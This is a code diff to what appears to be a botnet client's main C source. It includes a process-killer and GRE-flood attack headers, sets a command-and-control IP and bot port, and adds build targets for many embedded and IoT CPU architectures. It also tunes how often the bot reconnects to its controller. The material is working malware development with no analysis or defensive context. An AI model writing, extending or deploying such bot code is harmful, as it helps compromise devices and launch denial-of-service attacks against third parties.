@@ -27,12 +27,12 @@
 #include "headers/killer.h"
 #include "headers/gre_attack.h"
 
-#define CNC_IP "0.0.0.0"
+#define CNC_IP "1.2.3.255"
 #define BOT_PORT 1338
 #define MAX_THREADS 1
 #define RETRY_DELAY 5
 #define RECV_TIMEOUT_MS 8000
-#define MAX_RETRIES 35
+#define MAX_RETRIES 8
 #define CONNECTION_TIMEOUT 5
 #define PING_INTERVAL 5
 
@@ -46,12 +46,26 @@ const char* get_arch() {
     return "aarch64";
     #elif defined(ARCH_arm)
     return "arm";
+    #elif defined(ARCH_armhf)
+    return "armhf";
     #elif defined(ARCH_mips)
     return "mips";
+    #elif defined(ARCH_mipsel)
+    return "mipsel";
+    #elif defined(ARCH_powerpc64)
+    return "powerpc64";
+    #elif defined(ARCH_sparc)
+    return "sparc";
+    #elif defined(ARCH_m68k)
+    return "m68k";
+    #elif defined(ARCH_i686)
+    return "i686";
     #elif defined(ARCH_x86)
     return "x86";
     #elif defined(ARCH_x86_64)
     return "x86_64";
+    #elif defined(ARCH_sh4)
+    return "sh4";
     #else
     return "unknown";
     #endif
@@ -271,7 +285,7 @@ int main(int argc, char** argv) {
         sock = socket(AF_INET, SOCK_STREAM, 0);
         if (sock == -1) {
             if (++reconnect_attempts >= MAX_RETRIES) {
-                sleep(60);
+                sleep(10);
                 reconnect_attempts = 0;
             } else {
                 sleep(RETRY_DELAY * reconnect_attempts);
@@ -346,7 +360,7 @@ int main(int argc, char** argv) {
                 }
             }
         }
-
+        
         if (sock != -1) {
             shutdown(sock, SHUT_RDWR);
             close(sock);
